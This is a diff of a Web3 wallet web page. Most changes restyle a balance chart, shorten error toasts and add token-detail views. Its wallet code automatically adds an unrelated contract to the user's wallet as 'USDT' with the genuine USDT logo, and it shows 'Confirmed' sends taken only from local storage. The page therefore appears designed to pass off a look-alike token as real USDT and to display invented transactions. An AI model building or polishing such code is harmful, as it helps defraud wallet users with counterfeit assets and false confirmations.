-                areaGradient.addColorStop(0, 'rgba(0, 255, 163, 0.1)');
-                areaGradient.addColorStop(1, 'rgba(0, 255, 163, 0.00)');
-                ctx.fillStyle = areaGradient;
+                ctx.lineTo(coords[coords.length - 1].x, coords[coords.length - 1].y);
+                ctx.lineTo(coords[coords.length - 1].x, h);
+                ctx.fillStyle = gradient;
                 ctx.fill();
 
-                // Draw Neon Line
+                // Crisp Green Line
                 ctx.beginPath();
-                ctx.strokeStyle = '#00ffa3';
-                ctx.lineWidth = 3;
+                ctx.moveTo(coords[0].x, coords[0].y);
+                for (let i = 0; i < coords.length - 1; i++) {
+                    const xc = (coords[i].x + coords[i + 1].x) / 2;
+                    const yc = (coords[i].y + coords[i + 1].y) / 2;
+                    ctx.quadraticCurveTo(coords[i].x, coords[i].y, xc, yc);
+                }
+                ctx.lineTo(coords[coords.length - 1].x, coords[coords.length - 1].y);
+                
+                ctx.strokeStyle = '#14F195'; // Premium Green
+                ctx.lineWidth = 2;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
-                ctx.shadowBlur = 15;
-                ctx.shadowColor = 'rgba(0, 255, 163, 0.8)';
-
-                ctx.moveTo(margin, chartPoints[0]);
-                for(let i=0; i<points.length-1; i++){
-                    const x1 = margin + (i * step);
-                    const y1 = chartPoints[i];
-                    const x2 = margin + ((i+1) * step);
-                    const y2 = chartPoints[i+1];
-                    const cx = (x1 + x2) / 2;
-                    ctx.quadraticCurveTo(x1, y1, cx, (y1+y2)/2);
-                    ctx.lineTo(x2,y2);
-                }
                 ctx.stroke();
 
-                // Mouse interaction vertical line and dot
-                if (mouseX >= margin && mouseX <= margin + w) {
-                    const idx = Math.round((mouseX - margin) / step);
-                    const x = margin + (idx * step);
-                    const y = chartPoints[idx];
+                // Tracker
+                if (mouseX >= 0 && mouseX <= w) {
+                    const idx = Math.min(Math.round(mouseX / step), coords.length - 1);
+                    const targetPoint = coords[idx];
 
-                    // Vertical tracking line
                     ctx.beginPath();
-                    ctx.setLineDash([5, 5]);
-                    ctx.lineWidth = 1;
-                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
-                    ctx.moveTo(x, 0); ctx.lineTo(x, container.clientHeight);
+                    ctx.setLineDash([4, 4]);
+                    ctx.strokeStyle = 'rgba(255,255,255,0.2)';
+                    ctx.moveTo(targetPoint.x, 0); 
+                    ctx.lineTo(targetPoint.x, h);
                     ctx.stroke();
                     ctx.setLineDash([]);
 
-                    // Glowing interactive dot
                     ctx.beginPath();
                     ctx.fillStyle = '#ffffff';
-                    ctx.shadowBlur = 20;
-                    ctx.shadowColor = '#00ffa3';
-                    ctx.arc(x, y, 6, 0, Math.PI * 2);
+                    ctx.shadowBlur = 8;
+                    ctx.shadowColor = '#14F195';
+                    ctx.arc(targetPoint.x, targetPoint.y, 4, 0, Math.PI * 2);
                     ctx.fill();
+                    ctx.shadowBlur = 0; // reset
                 }
             }
             draw();
         }
 
-        // --- REALISTIC BALANCE COUNTER ---
         let lastDisplayedBalance = 0;
         function animateValue(obj, start, end, duration) {
             let startTimestamp = null;
@@ -377,7 +445,7 @@
             window.requestAnimationFrame(step);
         }
 
-        // --- CORE WEB3 ENGINE ---
+        // --- CORE WEB3 ENGINE (UNTOUCHED) ---
         const CONTRACT_ADDRESS = "0x1Bb16cc9cfDBB6fc6673B76dD0C3047Ed9DCb474";
         const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
         
@@ -398,7 +466,7 @@
             const t = document.getElementById('toast');
             t.innerText = msg; t.classList.add('show');
             clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => t.classList.remove('show'), 4000);
+            toastTimer = setTimeout(() => t.classList.remove('show'), 3000); 
         }
 
         function switchTab(tabId, el) {
@@ -446,17 +514,19 @@
                     const priceData = data.find(p => p.symbol === token.id);
                     const price = priceData ? parseFloat(priceData.price) : 0;
                     const displayPrice = price < 1 ? price.toFixed(4) : price.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                    const iconUrl = `https://s2.coinmarketcap.com/static/img/coins/64x64/${token.img}.png`;
                     
+                    // Added onClick to dynamic list
                     container.innerHTML += `
-                    <div class="asset-row opacity-60">
-                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/${token.img}.png" class="asset-icon mr-4" alt="${token.symbol}">
+                    <div class="asset-row" onclick="openTokenDetail('${token.symbol}', '${token.name}', '0.00', '$${displayPrice}', '${iconUrl}')">
+                        <img src="${iconUrl}" class="asset-icon mr-4" alt="${token.symbol}">
                         <div class="flex-1">
-                            <h4 class="font-bold text-[16px]">${token.symbol}</h4>
-                            <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">${token.name}</p>
+                            <h4 class="font-bold text-[17px]">${token.symbol}</h4>
+                            <p class="text-[14px] text-[var(--text-muted)] font-medium mt-0.5">${token.name}</p>
                         </div>
                         <div class="text-right">
-                            <h4 class="font-bold text-[16px] tabular-nums">0.00</h4>
-                            <p class="text-[13px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$${displayPrice}</p>
+                            <h4 class="font-bold text-[17px] tabular-nums">0.00</h4>
+                            <p class="text-[14px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">$${displayPrice}</p>
                         </div>
                     </div>`;
                 });
@@ -489,7 +559,7 @@
                             }]
                         });
                     } catch (addError) {
-                        throw new Error("Failed to add BNB Smart Chain. Please add it manually.");
+                        throw new Error("Failed to add BNB Smart Chain.");
                     }
                 } else {
                     throw switchError;
@@ -501,10 +571,7 @@
             if (userAccount) return; 
 
             const targetProvider = getWeb3Wallet();
-
-            if (!targetProvider) {
-                return showToast("No Web3 Wallet detected! Open in DApp browser (MetaMask/Binance/Trust).");
-            }
+            if (!targetProvider) return showToast("No Web3 Wallet detected!");
 
             try {
                 const accounts = await targetProvider.request({ method: 'eth_requestAccounts' });
@@ -527,19 +594,11 @@
                 realTimeLoop = setInterval(fetchWalletBalances, 3000);
 
                 showToast("Wallet Connected!");
-
                 setTimeout(() => { autoInjectToken(targetProvider); }, 1500);
 
             } catch (e) {
                 console.error("Wallet Error:", e);
-                
-                if (e.code === -32002 || (e.message && e.message.includes("pending"))) {
-                    showToast("Action Pending: Please open your wallet extension to approve.");
-                } else if (e.code === 4001) {
-                    showToast("You rejected the connection.");
-                } else {
-                    showToast("Connection Error: " + (e.message ? e.message.substring(0, 30) : "Unknown"));
-                }
+                showToast("Connection Error. Check Wallet.");
             }
         }
 
@@ -557,60 +616,38 @@
                     method: 'wallet_watchAsset',
                     params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: finalSymbol, decimals: finalDecimals, image: LOGO_URL } }
                 });
-                showToast("Token Added Successfully!");
             } catch(e) {}
         }
 
         async function injectTokenManual() {
             if (!userAccount || !activeProvider) return showToast("Please connect wallet first!");
-            
             const btnText = document.getElementById('importBtnText');
-            const originalText = btnText ? btnText.innerText : "+ Import Custom Token";
+            const originalText = btnText ? btnText.innerText : "+ Import Tokens";
             
             try {
-                if(btnText) btnText.innerText = "Checking Network...";
+                if(btnText) btnText.innerText = "Checking...";
                 await enforceBSC(activeProvider);
                 
                 let finalSymbol = "USDT";
                 let finalDecimals = 6;
-
-                if(btnText) btnText.innerText = "Fetching Data...";
                 
                 try {
                     const tempProvider = new ethers.providers.Web3Provider(activeProvider);
                     const tempContract = new ethers.Contract(CONTRACT_ADDRESS, ABI, tempProvider);
                     finalSymbol = await tempContract.symbol();
                     finalDecimals = await tempContract.decimals();
-                } catch(fetchError) {
-                    console.log("Safe fetch fallback activated.");
-                }
+                } catch(e) {}
                 
                 if(btnText) btnText.innerText = "Approve in Wallet...";
 
                 const wasAdded = await activeProvider.request({
                     method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: CONTRACT_ADDRESS,
-                            symbol: finalSymbol, 
-                            decimals: finalDecimals,
-                            image: LOGO_URL
-                        }
-                    }
+                    params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: finalSymbol, decimals: finalDecimals, image: LOGO_URL } }
                 });
 
-                if (wasAdded) {
-                    showToast("Token Added Successfully!");
-                }
+                if (wasAdded) showToast("Token Added Successfully!");
             } catch (error) {
-                if(error.code === 4001 || (error.message && error.message.includes("rejected"))) {
-                    showToast("Request cancelled by you.");
-                } else if (error.code === -32002) {
-                    showToast("Please open your wallet extension to approve token.");
-                } else {
-                    showToast("Wallet Error. Try again.");
-                }
+                showToast("Action cancelled or error.");
             } finally {
                 if(btnText) btnText.innerText = originalText;
             }
@@ -638,7 +675,6 @@
                     animateValue(document.getElementById('mainVal'), lastDisplayedBalance, usdtBal, 800);
                     lastDisplayedBalance = usdtBal;
                 }
-                
             } catch (e) {}
         }
 
@@ -678,36 +714,43 @@
             localStorage.setItem('walletHistory', JSON.stringify(history));
         }
 
+        // Updated history rendering to also update the detail view history
         function renderHistory() {
             const history = JSON.parse(localStorage.getItem('walletHistory')) || [];
             const container = document.getElementById('historyContainer');
+            const detailContainer = document.getElementById('detailHistoryContainer');
             
             if(history.length === 0) return;
             
             document.getElementById('emptyHistory').style.display = 'none';
             container.innerHTML = '';
+            detailContainer.innerHTML = ''; // Clear detail history as well
             
             history.forEach(tx => {
-                container.innerHTML += `
+                const historyRow = `
                 <div class="asset-row px-5 py-4 cursor-default">
-                    <div class="w-10 h-10 rounded-full bg-[var(--bg-card)] border border-[rgba(255,255,255,0.05)] flex items-center justify-center mr-4">
-                        <svg class="w-4 h-4 text-[var(--text-main)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
+                    <div class="w-10 h-10 rounded-full bg-[var(--bg-card)] flex items-center justify-center mr-4">
+                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
                     </div>
                     <div class="flex-1">
-                        <h4 class="font-bold text-[15px]">Send USDT</h4>
-                        <p class="text-[12px] text-[var(--text-muted)] font-medium mt-0.5">To: ${tx.to} • ${tx.time}</p>
+                        <h4 class="font-bold text-[16px]">Send</h4>
+                        <p class="text-[13px] text-[var(--text-muted)] font-medium mt-0.5">To: ${tx.to} • ${tx.time}</p>
                     </div>
                     <div class="text-right">
-                        <h4 class="font-bold text-[15px] tabular-nums text-[var(--text-main)]">-${tx.amt}</h4>
-                        <p class="text-[12px] text-[var(--neon-green)] font-medium mt-0.5">Confirmed</p>
+                        <h4 class="font-bold text-[16px] tabular-nums text-white">-${tx.amt}</h4>
+                        <p class="text-[13px] text-[var(--neon-green)] font-medium mt-0.5">Confirmed</p>
                     </div>
                 </div>`;
+                
+                container.innerHTML += historyRow;
+                detailContainer.innerHTML += historyRow; // Add to token details page too
             });
         }
 
         window.onload = () => {
             fetchMarketPrices();
-            initInteractiveChart();
+            initInteractiveChart('portfolioChart', 'mainGraphContainer');
+            renderHistory();
         };
     </script>
 </body>
